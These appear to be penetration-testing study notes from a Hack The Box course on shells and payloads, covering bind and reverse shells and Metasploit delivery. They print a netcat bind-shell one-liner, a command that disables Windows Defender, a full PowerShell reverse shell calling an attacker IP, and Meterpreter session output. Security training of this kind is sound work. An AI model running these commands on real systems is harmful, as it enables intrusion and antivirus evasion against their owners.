## [[generic-methodologies-and-resources/CPTS/6-Shells & Payloads/Introduction|Introduction]]
## Shell Basics
### Anatomy of a Shell
Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator` ([Windows Terminal](https://github.com/microsoft/terminal),[cmder](https://cmder.app),[xterm](https://invisible-island.net/xterm/)..)
a **Command Language Interpreters**  is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing, to view what shell language is in use `env | grep $SHELL` (SHELL=/usr/bin/zsh)
### Bind Shells
With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).
![bind shell](https://academy.hackthebox.com/storage/modules/115/bindshell.png)

- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

**Hands-on With A Simple BInd Shell in Linux:**
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f  # Server - Binding a Bash shell to the TCP session

nc -nv 10.129.41.200 7777 # Client - Connecting to bind shell on target
```
### Reverse Shells
With a `reverse shell`, the attack box will have a listener running, and the target will need to initiate the connection.
![reverse_shell](https://academy.hackthebox.com/storage/modules/115/reverseshell.png)
**Hands-on With A Simple Reverse Shell in Windows:**
==first we need to disable the windows defender antivirus (AV)==
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true # run in administrative powersehll console
```

```powershell
#  Client (target)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#  Server (attack box)
sudo nc -lvnp 443
```
## Payloads
the payload is the command and/or code that exploits the vulnerability in an OS and/or application
### Automating Payloads & Delivery with Metasploit

```bash
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter > 
```
> from the logged info we can see that **powershell** is the command language interpreter is used to establish a system shell session with the target
### Crafting Payloads with MSFvenom
=> check [[msfvenom|here]]
## Windows Shells
check =>  [[Windows Shells]] 
## Infiltrating Unix/Linux
When considering how we will establish a shell session on a Unix/Linux system, we will benefit from considering the following:
- What distribution of Linux is the system running?
- What shell & programming languages exist on the system?
- What function is the system serving for the network environment it is on?
- What application is the system hosting?
- Are there any known vulnerabilities?
check => [[linux| NIX Shells]]
##  Web Shells

A `web shell` is a browser-based shell session we can use to interact with the underlying operating system of a web server
 see more =>  [[web shells| Web Shells]]
 ## [[Detection & Prevention]]